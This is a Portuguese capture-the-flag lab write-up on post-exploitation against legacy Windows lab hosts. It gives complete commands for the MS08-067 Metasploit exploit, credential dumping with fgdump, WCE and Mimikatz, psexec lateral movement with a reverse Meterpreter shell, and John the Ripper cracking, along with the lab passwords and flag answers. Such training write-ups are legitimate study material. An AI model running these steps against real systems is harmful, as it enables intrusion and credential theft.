### SEMANA 08 - PÓS-EXPLORAÇÃO - CENÁRIO LEGADO

### LAB 01 - Acesso Inicial (Windows XP)

---

**ID do Lab:** `a772ece39697075f37cf3ebeeac8ac09a7319da4`

**Pergunta:** Comprometa o host: 172.16.1.4 e obtenha a key no diretório do usuário.

**Resposta:** Iniciamos com uma varredura de portas que identificou um Windows XP com SMB aberto. Ao rodar o script de vulnerabilidade do Nmap, confirmamos a presença da falha crítica **MS08-067**. Utilizamos o Metasploit para explorar essa vulnerabilidade, obtendo uma sessão Meterpreter com privilégios de `SYSTEM`. Na fase de pós-exploração, navegamos até o diretório do usuário `bernardo` e lemos o arquivo `bernardo.txt` contendo a key.

**Passo a Passo Técnico:**

1. **Enumeração de Portas:** Varredura inicial para identificar serviços ativos.
    
    Bash
    
    ```
    nmap -Pn 172.16.1.4 --open
    ```
    
2. **Detecção de Vulnerabilidade:** Uso de scripts NSE para confirmar a falha no serviço SMB.
    
    Bash
    
    ```
    nmap -Pn -sV 172.16.1.4 -p 110,139,445,3389 --script vuln
    ```
    
3. **Exploração (Metasploit):** Configuração e execução do exploit `ms08_067_netapi` contra o alvo.
    
    Bash
    
    ```
    search ms08-067
    use exploit/windows/smb/ms08_067_netapi
    set RHOSTS 172.16.1.4
    set LHOST tun0
    exploit
    ```
    
4. **Captura da Flag:** Navegação pelo sistema de arquivos até encontrar a prova de compromisso.
    
    Bash
    
    ```
    shell
    cd "C:\Documents and Settings\bernardo\Desktop"
    dir
    type bernardo.txt
    ```
    

**Resultado Obtido:**

- **Key:** `key(Us3rADown3d)`
    

### Evidências (Prints do Processo)

**1. Enumeração Básica (Nmap):**
![](../assets/Pasted%20image%2020251126220751.png)
**2. Confirmação da Vulnerabilidade (Script Vuln![](../assets/Pasted%20image%2020251126220754.png)):**

**3. Seleção do Exploit (Metasploit):**
![](../assets/Pasted%20image%2020251126220758.png)
**4. Configuração do Ataque:**
![](../assets/Pasted%20image%2020251126220802.png)
**5. Execução e Acesso (Meterpreter):**![](../assets/Pasted%20image%2020251126220805.png)

**6. Localização e Leitura da Key:**
![](../assets/Pasted%20image%2020251126220815.png)

### SEMANA 08 - PÓS-EXPLORAÇÃO - WINDOWS XP

### RELATÓRIO TÉCNICO - EXTRAÇÃO DE CREDENCIAIS (MEMORY DUMP)

---

#### 1. Contexto

**ID do Lab:** `511cd82511a268fe4a4190f8d4e99f5fd799c91c` **Objetivo:** Comprometer o host `172.16.1.4` e obter o nome de usuário e senha armazenados no cache do Active Directory. **Cenário:** Após obter acesso inicial (MS08-067), identificamos que a máquina pertence ao domínio `gbusiness.rede`. Precisamos extrair credenciais de usuários de domínio que logaram recentemente na máquina.

---

#### 2. Procedimento Técnico (Passo a Passo)

**Técnica 1: Extração de Hashes em Cache (FgDump)**

Para acessar as informações de cache e hashes locais, transferimos a ferramenta `fgdump.exe` para o alvo.

1. **Upload da Ferramenta:** No console do Meterpreter, realizamos o upload do executável para a raiz do sistema.
    
    Bash
    
    ```
    upload /usr/share/windows-binaries/fgdump/fgdump.exe C:\\
    ```
    
2. **Execução:** Acessamos o shell (`cmd.exe`) e executamos a ferramenta.
    
    DOS
    
    ```
    C:\> fgdump.exe
    ```
    
    _O comando gerou dois arquivos de saída: `127.0.0.1.pwdump` (hashes locais) e `127.0.0.1.cachedump` (hashes de domínio em cache)._
    
3. **Análise dos Resultados:** Ao ler o arquivo `.cachedump`, identificamos o usuário de domínio **`bernardo`**, confirmando que ele se autenticou nesta estação com credenciais do AD.
    

### Evidência (FgDump Upload e Execução)
![](../assets/Pasted%20image%2020251126223459.png)
![](../assets/Pasted%20image%2020251126223508.png)
![](../assets/Pasted%20image%2020251126223520.png)
![](../assets/Pasted%20image%2020251126223636.png)

**Técnica 2: Extração de Senha em Texto Claro (WCE)**

Para obter a senha legível (sem a necessidade de quebrar hashes), utilizamos o **Windows Credentials Editor (WCE)**.

1. **Upload:** Transferimos o `wce-universal.exe` para o alvo.
    
    Bash
    
    ```
    upload /usr/share/windows-resources/wce/wce-universal.exe C:\\
    ```
    
2. **Execução (Clear Text):** Executamos a ferramenta com a flag `-w` para ler as senhas armazenadas no processo LSASS (WDigest).
    
    DOS
    
    ```
    wce-universal.exe -w
    ```
    
3. **Resultado:** A ferramenta revelou a senha em texto claro do usuário logado.
    
    - **Usuário:** `bernardo`
        
    - **Senha:** `1#bernard`
        

### Evidência (WCE - Senha Revelada)
![](../assets/Pasted%20image%2020251126223849.png)
![](../assets/Pasted%20image%2020251126223655.png)![](../assets/Pasted%20image%2020251126223720.png)
---

**Técnica 3: Validação via Mimikatz (Kiwi)**

Como método alternativo e de confirmação, utilizamos o módulo `kiwi` nativo do Metasploit.

1. **Carregamento do Módulo:**
    
    Bash
    
    ```
    load kiwi
    ```
    
2. **Extração de Credenciais:**
    
    Bash
    
    ```
    creds_all
    ```
    
    _O comando confirmou as mesmas credenciais obtidas pelo WCE._
    

### Evidência (Kiwi/Mimikatz)
![](../assets/Pasted%20image%2020251126223814.png)
---

**Conclusão:** Obtivemos com sucesso as credenciais de domínio do usuário `bernardo` (`bernardo:1#bernard`), permitindo a movimentação lateral para outros servidores da rede.

### SEMANA 08 - PÓS-EXPLORAÇÃO - CENÁRIO LEGADO (AD)

### Captura da Flag  (Administrator)

---

**ID do Lab:** `a435de5fc3f08cfb0b6d7021b4e8bebe0c9a2a12`

**Pergunta:** Utilize as credenciais obtidas anteriormente. Qual a key encontrada dentro do usuário administrator?

**Resposta:** Com as credenciais de domínio do usuário `bernardo` (extraídas no Lab de Windows XP), realizamos uma conexão SMB direta ao Controlador de Domínio (`172.16.1.60`). Acessamos o compartilhamento administrativo `C$` e navegamos até o diretório pessoal do Administrador para ler a flag.

**Passo a Passo Técnico:**

1. **Enumeração de Compartilhamentos:** Utilizamos o `smbclient` para listar os compartilhamentos disponíveis no servidor, autenticando com o usuário `bernardo`.
    
    Bash
    
    ```
    smbclient -L //172.16.1.60 -U bernardo
    ```
    
2. **Acesso ao Sistema de Arquivos (C$):** Conectamos ao compartilhamento raiz `C$\` (que permite acesso ao disco inteiro).
    
    Bash
    
    ```
    smbclient //172.16.1.60/C$ -U bernardo
    ```
    
3. **Navegação e Captura:** Dentro do console SMB, navegamos até o diretório do Administrador e lemos o arquivo `key.txt`.
    
    Bash
    
    ```
    cd Users\Administrator\Desktop
    dir
    get key.txt
    !cat key.txt
    ```
    

**Resultado Obtido:**

- **Key:** `988967543672`
    

### Evidências (Prints do Processo)

**1. Listagem e Conexão ao Share C$:**
![](../assets/Pasted%20image%2020251126225054.png)
**2. Localização do Arquivo no Desktop:**
![](../assets/Pasted%20image%2020251126225059.png)
**3. Leitura da Key:**
![](../assets/Pasted%20image%2020251126225102.png)

FORMA ALTERNATIVA DO LAB 

### Movimentação Lateral e Captura (Metasploit/Psexec)

---

**ID do Lab:** `a435de5fc3f08cfb0b6d7021b4e8bebe0c9a2a12`

**Pergunta:** Utilize as credenciais obtidas anteriormente. Qual a key encontrada dentro do usuário administrator?

**Resposta:** Utilizando as credenciais de domínio do usuário `bernardo` (extraídas anteriormente), realizamos uma movimentação lateral para o Controlador de Domínio (`172.16.1.60`) usando o módulo `psexec` do Metasploit. Após obter uma sessão **Meterpreter** com privilégios de sistema (`SYSTEM`), navegamos diretamente pelo sistema de arquivos até o Desktop do Administrador para ler a flag, sem a necessidade de ferramentas externas.

**Passo a Passo Técnico:**

1. **Configuração do Ataque (Lateral Movement):** Carregamos o módulo `psexec` no Metasploit, configuramos as credenciais capturadas e o alvo.
    
    Bash
    
    ```
    use exploit/windows/smb/psexec
    set RHOSTS 172.16.1.60
    set SMBUser bernardo
    set SMBPass 1#bernard
    set SMBDomain GBUSINESS
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST tun0
    exploit
    ```
    
2. **Validação do Acesso:** A sessão Meterpreter foi aberta. Confirmamos o alvo com `sysinfo` (Host: `SRVINT`, OS: `Windows Server 2008 R2`).
    
3. **Captura da Flag:** Dentro da sessão Meterpreter, navegamos até o diretório do usuário alvo e lemos o conteúdo.
    
    Bash
    
    ```
    cd C:\\Users\\Administrator\\Desktop
    ls -la
    cat key.txt
    ```
    

**Resultado Obtido:**

- **Key:** `988967543672`
    

### Evidências (Prints do Processo)

**1. Configuração e Execução do Psexec:**

**2. Validação do Sistema (Sysinfo):**
![](../assets/Pasted%20image%2020251126225820.png)
**3. Navegação e Leitura da Key (Meterpreter):**
![](../assets/Pasted%20image%2020251126225848.png)

### SEMANA 08 - PÓS-EXPLORAÇÃO - CENÁRIO LEGADO (AD)

### - Dump de Memória no Controlador de Domínio

---

**ID do Lab:** `c88c21b137aea99ccbb6f5d175aa0bbd62746102`

**Pergunta:** Qual a senha do usuário Administrator?

**Resposta:** Após obter acesso ao Controlador de Domínio (`SRVINT`), realizamos um dump de memória utilizando a ferramenta **WCE (Windows Credentials Editor)**. Isso nos permitiu extrair as senhas em texto claro armazenadas pelo processo LSASS, revelando a credencial do Administrador do Domínio.

**Passo a Passo Técnico:**

1. **Acesso Inicial e Reconhecimento:** Utilizamos o Metasploit (via Psexec ou EternalBlue) para obter uma sessão Meterpreter no servidor. Confirmamos a arquitetura do sistema (x64) com o comando `sysinfo`.
    
2. **Upload da Ferramenta (WCE x64):** Como o servidor é 64 bits, transferimos a versão compatível do WCE para a raiz do sistema.
    
    Bash
    
    ```
    upload /usr/share/windows-resources/wce/wce64.exe c:\\
    ```
    
3. **Execução e Dump de Senhas:** Acessamos o shell do Windows e executamos a ferramenta com a flag `-w` para ler as credenciais em _clear text_.
    
    DOS
    
    ```
    c:\> wce64.exe -w
    ```
    

**Resultado Obtido:**

A ferramenta extraiu com sucesso as senhas dos usuários logados:

- **Administrator:** `GBcorps3rv3r08`
    
- **rogerio:** `Roger@10`
    
- **bernardo:** `1#bernard`
    

### Evidências (Prints do Processo)

**1. Upload da Ferramenta:**
![](../assets/Pasted%20image%2020251126231359.png)
**2. Verificação do Arquivo (Dir):**
![](../assets/Pasted%20image%2020251126231403.png)
**3. Execução do WCE e Senhas Reveladas:**
![](../assets/Pasted%20image%2020251126231407.png)

---

**Nota Adicional:** O comando `hashdump` do Meterpreter também foi executado, capturando os hashes NTLM, mas apenas o WCE revelou a senha em texto claro necessária para o lab.

### Evidência (Hashdump):
![](../assets/Pasted%20image%2020251126231350.png)

### SEMANA 08 - PÓS-EXPLORAÇÃO - WINDOWS XP

### LAB - Extração de Hash NTLM (Camila)

---

**ID do Lab:** `d9faa71a3f6468a336ad323fbdeafe6d4e3584f4`

**Pergunta:** Utilize as credenciais obtidas no cache do host 172.16.1.4. Qual o hash NTLM do usuário camila?

**Resposta:** Após comprometer a estação de trabalho Windows XP e obter privilégios de sistema (`SYSTEM`), realizamos o dump dos hashes de senha armazenados localmente (SAM e Cache de Domínio). Identificamos a usuária `camila` e extraímos seu hash NTLM.

**Comando Utilizado:**

Bash

```
# No Meterpreter
hashdump

# OU via FgDump/Pwdump
type 127.0.0.1.pwdump
```

**Resultado Obtido:**

- **Usuário:** `camila`
    
- **Hash NTLM:** `8d7553f39cf607eb0412f126763150c5`
    

### Evidência (Hash Extraído)
![](../assets/Pasted%20image%2020251126231833.png)

### SEMANA 08 - HASHES E SENHAS - WINDOWS (LEGADO)

### LAB - Quebra de Senha NTLM (Camila)

---

**ID do Lab:** `7045e30cbb906b2cd38a188a6a2e9da2e02f994e`

**Pergunta:** Descubra a senha do hash NTLM (camila) descoberto anteriormente.

**Resposta:** Utilizando o hash NTLM da usuária `camila` (que foi extraído do cache da estação Windows XP comprometida), realizamos um ataque de dicionário offline. Empregamos a ferramenta **John the Ripper** configurada para o formato NT (NTLM) e utilizamos uma wordlist padrão (`rockyou.txt` ou lista personalizada).

**Comando Utilizado:**

Bash

```
# Execução do ataque
john hashes_gbusiness.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

# Visualização do resultado
john hashes_gbusiness.txt --format=NT --show
```

**Resultado Obtido:**

- **Usuário:** `camila`
    
- **Senha:** `Apolo201`
    

### Evidência (Print do Resultado)
![](../assets/Pasted%20image%2020251126232205.png)